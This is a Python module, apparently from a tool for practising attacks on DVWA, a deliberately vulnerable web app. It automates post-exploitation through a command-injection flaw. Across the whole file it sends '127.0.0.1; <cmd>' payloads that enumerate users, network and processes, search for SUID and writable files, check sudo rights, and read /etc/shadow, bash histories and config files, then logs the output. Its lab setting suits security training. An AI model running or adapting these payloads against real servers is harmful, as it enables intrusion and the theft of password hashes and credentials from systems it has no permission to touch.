"""
Post-Exploitation Module
내부 침투 및 권한 상승 모듈
"""

import time
import re
from utils.logger import log_attack, log_command_output

# Post-exploitation 명령어 목록
POST_EXPLOIT_COMMANDS = {
    'system_info': [
        'uname -a',
        'cat /etc/os-release',
        'cat /proc/version',
        'hostname',
    ],
    'user_enum': [
        'whoami',
        'id',
        'cat /etc/passwd',
        'cat /etc/group',
        'w',
        'last',
    ],
    'network_enum': [
        'ifconfig -a',
        'ip addr',
        'netstat -antup',
        'ss -tulpn',
        'arp -a',
        'route -n',
    ],
    'process_enum': [
        'ps aux',
        'ps -ef',
        'top -n 1',
    ],
    'file_search': [
        'find / -perm -4000 2>/dev/null',  # SUID 파일
        'find / -writable -type f 2>/dev/null',  # 쓰기 가능 파일
        'find /home -type f -name "*.txt" 2>/dev/null',
        'find /var/www -type f -name "*.conf" 2>/dev/null',
        'ls -la /home',
        'ls -la /root',
    ],
    'privilege_check': [
        'sudo -l',
        'cat /etc/sudoers',
        'getcap -r / 2>/dev/null',
    ],
    'sensitive_files': [
        'cat /etc/shadow',
        'cat /root/.bash_history',
        'cat /home/*/.bash_history',
        'cat /var/www/html/config.php',
        'find / -name "*.conf" 2>/dev/null | head -20',
    ],
}

def run_attack(session, delay=1):
    """
    Post-Exploitation 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': {}
    }

    print("  [*] Post-Exploitation 단계 시작")
    print("  [*] 주의: 이 단계는 command injection 취약점을 통해 실행됩니다.\n")

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    for category, commands in POST_EXPLOIT_COMMANDS.items():
        print(f"  [*] {category} 수집 중...")
        category_results = []

        for cmd in commands:
            results['attempts'] += 1

            try:
                # Command Injection을 통한 명령어 실행
                payload = f"127.0.0.1; {cmd}"
                params = {
                    'ip': payload,
                    'Submit': 'Submit'
                }

                response = session.session.get(cmdi_url, params=params)

                # HTML에서 실제 명령어 출력 추출
                command_output = extract_command_output(response.text)

                # 명령어 실행 여부 확인 (응답에 ping 외의 내용이 있는지)
                if command_output and is_command_output_present(response.text, cmd):
                    results['successful'] += 1
                    category_results.append({
                        'command': cmd,
                        'output_length': len(command_output)
                    })

                    # 실제 명령어 출력을 상세 로그에 기록
                    log_command_output(cmd, category, command_output, preview_lines=30)

                    log_attack(
                        'POST_EXPLOIT',
                        'SUCCESS',
                        f"Category: {category}, Command: {cmd}",
                        response.status_code,
                        len(response.text)
                    )
                    print(f"    [+] 성공: {cmd} ({len(command_output)} bytes)")
                else:
                    log_attack(
                        'POST_EXPLOIT',
                        'FAILED',
                        f"Category: {category}, Command: {cmd}",
                        response.status_code,
                        len(response.text)
                    )

                time.sleep(delay)

            except Exception as e:
                log_attack(
                    'POST_EXPLOIT',
                    'ERROR',
                    f"Command: {cmd}, Error: {str(e)}",
                    0,
                    0
                )
                print(f"    [-] 오류: {cmd} - {str(e)}")

        if category_results:
            results['findings'][category] = category_results
            results['success'] = True

    print(f"\n[*] Post-Exploitation 완료: {results['successful']}/{results['attempts']} 성공")
    print_post_exploit_summary(results['findings'])

    return results

def is_command_output_present(response_text, command):
    """
    명령어 실행 결과가 응답에 포함되어 있는지 확인

    Args:
        response_text: HTTP 응답 본문
        command: 실행한 명령어

    Returns:
        bool: 명령어 실행 결과 포함 여부
    """
    # DVWA ping 기본 출력과 다른 내용이 있는지 확인
    if len(response_text) < 500:  # ping 결과만 있을 경우 짧음
        return False

    # 명령어별 예상 출력 패턴
    output_patterns = {
        'uname': ['Linux', 'GNU'],
        'whoami': ['www-data', 'root', 'apache'],
        'id': ['uid=', 'gid='],
        'passwd': ['root:x:', '/bin/bash'],
        'ifconfig': ['inet', 'netmask'],
        'netstat': ['tcp', 'LISTEN'],
        'ps': ['PID', 'CMD'],
        'find': ['/', 'permission denied'],
        'sudo': ['User', 'may run'],
        'bash_history': ['cd ', 'ls ', 'cat '],
    }

    # 명령어에 해당하는 패턴 찾기
    for key, patterns in output_patterns.items():
        if key in command.lower():
            for pattern in patterns:
                if pattern.lower() in response_text.lower():
                    return True

    # 일반적인 명령어 출력 패턴
    general_patterns = ['root:', 'uid=', 'inet ', '/bin/', '/usr/', '/var/']
    for pattern in general_patterns:
        if pattern in response_text:
            return True

    return False

def extract_command_output(html_response):
    """
    HTML 응답에서 실제 명령어 출력 추출

    Args:
        html_response: HTTP 응답 본문

    Returns:
        str: 추출된 명령어 출력
    """
    try:
        # DVWA의 command injection 결과는 <pre> 태그 내에 있음
        pre_match = re.search(r'<pre>(.*?)</pre>', html_response, re.DOTALL)
        if pre_match:
            output = pre_match.group(1)
            # ping 결과 제거 (127.0.0.1 관련 내용)
            lines = output.split('\n')
            filtered_lines = []
            skip_ping = False

            for line in lines:
                # ping 명령어 시작 감지
                if 'PING 127.0.0.1' in line or 'ping statistics' in line:
                    skip_ping = True
                    continue
                # ping 결과가 끝나면
                if skip_ping and line.strip() and not any(x in line for x in ['64 bytes', 'packets transmitted', 'rtt min']):
                    skip_ping = False

                if not skip_ping and line.strip():
                    filtered_lines.append(line)

            return '\n'.join(filtered_lines)
        return ""
    except Exception:
        return ""

def print_post_exploit_summary(findings):
    """
    Post-Exploitation 결과 요약 출력

    Args:
        findings: 수집된 정보
    """
    if not findings:
        return

    print("\n  [*] 수집된 정보 요약:")
    for category, results in findings.items():
        print(f"    - {category}: {len(results)}개 명령어 성공")
